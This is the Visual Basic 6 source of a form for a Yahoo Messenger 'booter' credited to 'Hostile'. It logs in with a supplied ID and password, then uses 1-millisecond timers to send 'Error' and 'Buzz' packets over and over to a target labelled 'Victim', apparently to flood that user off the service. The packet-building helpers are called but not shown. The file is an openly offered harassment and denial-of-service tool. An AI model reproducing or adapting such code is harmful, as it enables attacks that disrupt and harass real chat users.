VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form Form1 
   BorderStyle     =   4  'Fixed ToolWindow
   Caption         =   "Source To A Booter - By Hostile"
   ClientHeight    =   1485
   ClientLeft      =   45
   ClientTop       =   345
   ClientWidth     =   3345
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   1485
   ScaleWidth      =   3345
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Begin VB.Timer Timer2 
      Enabled         =   0   'False
      Interval        =   1
      Left            =   1920
      Top             =   1920
   End
   Begin VB.CommandButton Command6 
      Caption         =   "Stop"
      Height          =   255
      Left            =   2640
      TabIndex        =   9
      Top             =   840
      Width           =   615
   End
   Begin VB.CommandButton Command5 
      Caption         =   "Buzz"
      Height          =   255
      Left            =   1680
      TabIndex        =   8
      Top             =   840
      Width           =   615
   End
   Begin MSWinsockLib.Winsock Sock 
      Left            =   2400
      Top             =   1920
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.Timer Timer1 
      Enabled         =   0   'False
      Interval        =   1
      Left            =   2880
      Top             =   1920
   End
   Begin VB.CommandButton Command4 
      Caption         =   "Stop"
      Height          =   255
      Left            =   2640
      TabIndex        =   6
      Top             =   480
      Width           =   615
   End
   Begin VB.CommandButton Command3 
      Caption         =   "Error"
      Height          =   255
      Left            =   1680
      TabIndex        =   5
      Top             =   480
      Width           =   615
   End
   Begin VB.CommandButton Command2 
      Caption         =   "Logout"
      Height          =   255
      Left            =   840
      TabIndex        =   4
      Top             =   840
      Width           =   615
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Login"
      Height          =   255
      Left            =   120
      TabIndex        =   3
      Top             =   840
      Width           =   615
   End
   Begin VB.TextBox Text3 
      Alignment       =   2  'Center
      Height          =   285
      Left            =   1680
      TabIndex        =   2
      Text            =   "Victim"
      Top             =   120
      Width           =   1575
   End
   Begin VB.TextBox Text2 
      Alignment       =   2  'Center
      Height          =   285
      Left            =   120
      TabIndex        =   1
      Text            =   "Password"
      Top             =   480
      Width           =   1335
   End
   Begin VB.TextBox Text1 
      Alignment       =   2  'Center
      Height          =   285
      Left            =   120
      TabIndex        =   0
      Text            =   "Yahoo ID"
      Top             =   120
      Width           =   1335
   End
   Begin VB.Label Label1 
      Alignment       =   2  'Center
      Caption         =   "Idle"
      Height          =   255
      Left            =   0
      TabIndex        =   7
      Top             =   1200
      Width           =   3255
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Command1_Click()
   ID = Text1.Text
   pass = Text2.Text
   Sock.Close
   Sock.Connect "scs.msg.yahoo.com", 5050
End Sub
Private Sub Command2_Click()
Label1.Caption = "Logged Out"
Sock.Close
End Sub
Private Sub Command3_Click()
Label1.Caption = "Booting"
Timer1.Enabled = True
End Sub
Private Sub Command4_Click()
Label1.Caption = "Stopped"
Timer1.Enabled = False
End Sub

Private Sub Command5_Click()
Label1.Caption = "Booting"
Timer2.Enabled = True
End Sub
Private Sub Command6_Click()
Label1.Caption = "Stopped"
Timer2.Enabled = False
End Sub

'Source To A Booter - Hostile
'www.Yahoo-Terrorists.com
'www.Leet-Programmers.com
'www.The-Source.org
Private Sub Timer1_Timer()
On Error Resume Next
If Sock.State = sckConnected Then: Sock.SendData Error(Text1, Text3)
End Sub
Private Sub Sock_Connect()
Label1.Caption = "connecting"
Sock.SendData Data(ID)
End Sub
Private Sub Sock_DataArrival(ByVal bytesTotal As Long)
Dim Data As String
Sock.GetData Data
Debug.Print Data
  If Mid(Data, 12, 1) = "W" Then
    Sessionkey = Mid(Data, 17, 4)
    ChallengeString = Mid(Data, 30 + Len(ID), Len(Data) - 29)
    ChallengeString = Replace(ChallengeString, "À€13À€1À€", "")
    Call GetStrings(ID, pass, ChallengeString, Crypt(0), Crypt(1), 1)
    Sock.SendData Login(ID)
    ElseIf Mid(Data, 12, 1) = "T" Then
    Label1.Caption = "wrong ID/pass"
    Sock.Close
    ElseIf Mid(Data, 12, 1) = "U" Then
    Sessionkey = Mid(Data, 17, 4)
   Label1.Caption = "connected"
End If
End Sub
Private Sub Sock_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
Label1.Caption = "error"
Sock.Close
End Sub

Private Sub Timer2_Timer()
On Error Resume Next
If Sock.State = sckConnected Then: Sock.SendData HostileBuzz(Text1, Text3)
End Sub
